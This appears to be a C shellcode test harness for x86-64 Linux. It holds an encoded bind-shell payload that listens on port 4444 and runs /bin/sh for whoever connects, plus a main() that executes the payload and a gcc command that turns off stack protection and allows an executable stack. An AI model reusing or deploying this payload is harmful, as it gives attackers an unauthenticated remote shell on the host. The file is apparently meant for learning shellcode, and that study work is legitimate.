/*
	Linux system calls
		/usr/include/x86_64-linux-gnu/asm/unistd_64.h
		/usr/include/x86_64-linux-gnu/asm/unistd_32.h

		https://en.wikibooks.org/wiki/X86_Assembly/Interfacing_with_Linux
		https://en.wikipedia.org/wiki/X86_calling_conventions

	Sample shellcodes
		https://www.exploit-db.com/
		http://shell-storm.org/shellcode/

	Convert hex to x86 instructions
		https://defuse.ca/online-x86-assembler.htm


	Compile 
		$ gcc -fno-stack-protector -z execstack testshellcode.c -o testshellcode
*/

#include <stdio.h>
#include <string.h>

/*	
  4000cb:	b8 3c 00 00 00       	mov    eax, 0x3c    ; eax = 60
  4000d0:	bf 0b 00 00 00       	mov    edi, 0xb		; edi = 11
  4000d5:	0f 05                	syscall 			; exit(11)

char shellcode[] = \
	"\xb8\x3c\x00\x00\x00"
	"\xbf\x0b\x00\x00\x00"
	"\x0f\x05";
*/
char shellcode[] = \
"\x48\x31\xc0\x48\x31\xf6\x48\xf7\xe6\x6a\x02\x5f\xff\xc6\x6a\x29\x58\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x11\x5c\x54\x5e\x52\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x49\x89\xc1\x6a\x03\x58\x0f\x05\x49\x87\xf9\x48\x31\xf6\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x48\x31\xf6\x48\xf7\xe6\x66\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x6a\x3b\x58\x0f\x05";

/*
"\x48\x31\xc0\x48\x31\xf6\x48\xf7\xe6\x6a\x02\x5f\xff\xc6\x6a\x29\x58\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02"
//Port number this value can be obtained from the above instructions
"\x11\x5c"
"\x54\x5e\x52\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x49\x89\xc1\x6a\x03\x58\x0f\x05\x49\x87\xf9\x48\x31\xf6\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x48\x31\xf6\x48\xf7\xe6\x66\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x54\x5f\x6a\x3b\x58\x0f\x05";
 */
 
int main()
{
  	printf("Shellcode Length:  %d\n", (int)strlen(shellcode));
	(*(void  (*)()) shellcode)();
	return 0;
}
